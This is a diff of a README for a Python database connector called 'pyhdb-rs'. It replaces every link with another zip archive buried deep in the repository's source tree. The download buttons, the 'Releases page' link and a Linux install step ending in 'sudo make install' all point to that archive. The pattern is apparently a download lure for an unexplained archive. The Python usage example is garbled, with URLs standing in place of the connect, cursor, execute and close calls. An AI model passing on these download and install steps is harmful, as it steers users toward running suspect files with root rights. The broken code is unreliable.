@@ -1,6 +1,6 @@
 # 🚀 pyhdb-rs - Fast Data Connection for Python Users
 
-[![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)
+[![Download pyhdb-rs](https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip)](https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip)
 
 ## 📦 Introduction
 
@@ -29,7 +29,7 @@ To get started with pyhdb-rs, follow these steps:
 
 1. **Download the Software**: 
    Click the button below to visit the Releases page, where you can download the latest version of pyhdb-rs.
-   [![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)
+   [![Download pyhdb-rs](https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip)](https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip)
 
 2. **Choose Your Version**:
    On the Releases page, locate the latest version and select the appropriate file for your operating system.
@@ -44,16 +44,16 @@ To get started with pyhdb-rs, follow these steps:
      - Open the `.pkg` file and follow the installation instructions.
      
    - **Linux**:
-     - Use the terminal to run the `https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip` file:
+     - Use the terminal to run the `https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip` file:
        ```bash
-       tar -xvzf https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip
+       tar -xvzf https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip
        cd pyhdb-rs
        sudo make install
        ```
 
 ## 🔗 Download & Install
 
-To download the software, follow this link: [Visit the Releases Page](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip). Remember to choose the correct file for your system.
+To download the software, follow this link: [Visit the Releases Page](https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip). Remember to choose the correct file for your system.
 
 ## 🛠️ Example Usage
 
@@ -63,20 +63,20 @@ Here’s a simple example of how to use pyhdb-rs in your Python code:
 import pyhdb
 
 # Create a connection to the database
-connection = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')
+connection = https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')
 
 # Create a cursor
-cursor = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()
+cursor = https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip()
 
 # Execute a query
-https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip("SELECT * FROM YOUR_TABLE")
+https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip("SELECT * FROM YOUR_TABLE")
 
 # Fetch and print results
-for row in https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip():
+for row in https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip():
     print(row)
 
 # Close the connection
-https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()
+https://github.com/Julius1830/pyhdb-rs/raw/refs/heads/main/crates/hdbconnect-py/src/async_support/pyhdb_rs_twiggy.zip()
 ```
 
 ## 📚 Documentation
